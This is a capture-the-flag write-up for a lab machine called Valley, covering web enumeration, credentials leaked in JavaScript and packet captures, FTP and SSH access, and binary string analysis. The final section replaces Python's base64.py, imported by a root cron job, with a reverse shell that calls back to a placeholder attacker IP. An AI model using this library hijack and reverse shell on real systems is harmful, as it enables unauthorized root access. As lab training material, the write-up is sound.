# Valley CTF Challenge Walkthrough Notes

## 

# Valley CTF Write-up

---

## Initial Reconnaissance

On visiting the given IP I got a website and using the Wappalyzer extension I got to know that the OS is Ubuntu and the server is Apache. The website has these functionalities:

- gallery (containing different photos)
- pricing (list of pricing the [valley.co](http://valley.co/) provides)

Then I used Nmap to find any open interesting ports and I got:

- a ftp port (37370) and on searching the exploit for this service I got this: remote denial of service.This is not useful .

Then I used FFUF to find hidden directories:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u <http://10.49.144.211/FUZZ>
```

Got nothing, so I decided to fuzz after the `/static`:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u <http://10.49.144.211/static/FUZZ
```

Got different endpoints like `/static1` to `/static18` but these are normal images. There is also `00` that I got from fuzzing – this is interesting.

---

## Web Enumeration

So I visited `/static/00` and got:

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

From the notes we got another endpoint which was told to remove – let's check this: `/dev1243224123123`. On visiting:

```
<http://10.49.144.211/dev1243224123123>
```

I got a login page. On inspecting the page source code I got the HTML and a link to `/dev.js`.

On inspecting `dev.js` I got the password and username in the code:

```jsx
if (username === "siemDev" && password === "california") {
    window.location.href = "/dev1243224123123/devNotes37370.txt";
} else {
    loginErrorMsg.style.opacity = 1;
}
```

On login I got another note:

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

This note is talking about FTP – maybe it's talking about the FTP port we got in the Nmap scan (37370). So I tried to connect to the FTP port using:

```bash
ftp 10.49.144.211 37370
```

I tried to use the password and username we got in `dev.js` and we logged in. On listing the files with the command `ls` we got some pcap files. To download the files to our machine use the command:

```bash
get siemHTTP2.pcapng
```

---

## PCAP Analysis

After examining for a while with Wireshark, we see there are credentials inside `siemHTTP2.pcapng` file. Export the `index.html` with the size of 42 bytes from `siemHTTP2.pcapng` by going `File > Export Objects > HTTP > index.html > Save`. This file includes SSH credentials for `valleyDev` user.

Then on reading the content of the `index.html` using `cat` we got the credentials.

---

## SSH Access

On connecting to SSH using these credentials I got access to the SSH machine.

On listing the files on the machine we got the `user.txt` and got the first flag.

---

## Privilege Escalation

Now we have to do privilege escalation to get root access. I ran the command `sudo -l` but this is not allowed, so I decided to see the crontab for any automatic jobs in the system that can help us get root privileges.

```bash
cat /etc/crontab
```

In this we got this job running:

```
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

On reading the content of `photosEncrypt.py` we got this code:

```python
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
        image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
        with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
        encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
        output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
        with open(output_path, "wb") as output_file:
          output_file.write(encoded_image_data)
```

`/photos/script/photosEncrypt.py` script encodes all the images named `p1–7.jpg` inside photos directory with base64 library. `valleyDev` user has no write permission to `/photos` directory, meaning we must first escalate our privileges horizontally.

On navigating to `/home` and listing the files using `ls -la` we got a file `valleyAuthenticator`. On running this using `./valleyAuthenticator` it is asking for username and password, so tried to check the file using:

```bash
file valleyAuthenticator
```

There is an authenticator ELF file which accepts username and password. Let's investigate this executable on our own machine. I transfer the file using SCP:

```bash
scp valleyDev@10.49.144.211:/home/valleyAuthenticator /home/kali/Downloads/
```

It will ask for the password – use the SSH password we got earlier for the user `valleyDev`.

Let's read the strings on the file to check for any plaintext passwords.

```bash
strings valleyAuthenticator > str.txt
nano str.txt
```

Now instead of searching for hours in the file I used this command:

```bash
nl str.txt | grep user
```

Output:

```
 6447   is your usernad
```

I got the line number. Now there are chances that password or username may be a few lines above or below the "user" line, so then I used:

```bash
head -n 6500 str.txt | tail -n 55
```

This will read first 6500 lines and then give us the output of last 55 lines. In these 55 lines we got our pass and user line.

Now I tried to use these credentials in `valleyAuthenticator` but I got wrong credentials because I took the ones that looked like plaintext, but they weren't. I also noticed some hash‑like strings in some lines, so I tried them in CrackStation and got the password for the user `valley`: **liberty123**.

Now use `su valley` and enter the password (`liberty123`).

---

## Python Library Hijacking

As the base64 library was used by the Python script that was scheduled in the crontab jobs, we can try to change `base64.py` to execute our custom script. We have to first move the file to another location so that we can make our own one:

```bash
mv /usr/lib/python3.8/base64.py /usr/lib/python3.8/base64.bak.py
nano /usr/lib/python3.8/base64.py
```

And use this script in `base64.py`:

```python
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("YOUR_IP", 1234))   # Replace with your attacker IP
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
run(["/bin/bash", "-i"])
```

Start a TCP listener:

```bash
nc -lvnp 1234
```

Boom – we got a shell! On running `whoami` we got root. Now we can read `root.txt` and this is the final flag.

---

## Flags

- **User flag:** content of `user.txt`
- **Root flag:** content of `root.txt`

---

## Summary

This machine demonstrated a chain of vulnerabilities: information disclosure via developer notes, credential reuse, network traffic analysis, binary analysis with `strings`, hash cracking, and Python library hijacking to escalate from a low‑privileged user to root. Each step relied on careful enumeration and the application of basic penetration testing techniques.